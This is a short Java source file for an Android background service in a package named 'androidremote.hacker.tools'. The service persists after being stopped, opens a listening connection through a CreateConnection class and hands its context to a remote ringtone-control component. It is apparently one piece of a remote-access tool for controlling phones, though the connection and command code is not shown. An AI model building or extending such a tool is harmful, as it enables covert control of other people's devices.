package com.androidremote.hacker.tools;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.net.Socket;

import static com.androidremote.hacker.tools.CreateConnection.sendStrings;


public class DOM extends Service {
    public DOM() {
    }



    @Override
    public int onStartCommand(Intent i, int f, int s){

        CreateConnection.listen();
        Remote.Sonnerie.muContext=DOM.this;
        //sendStrings("salut bro");
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}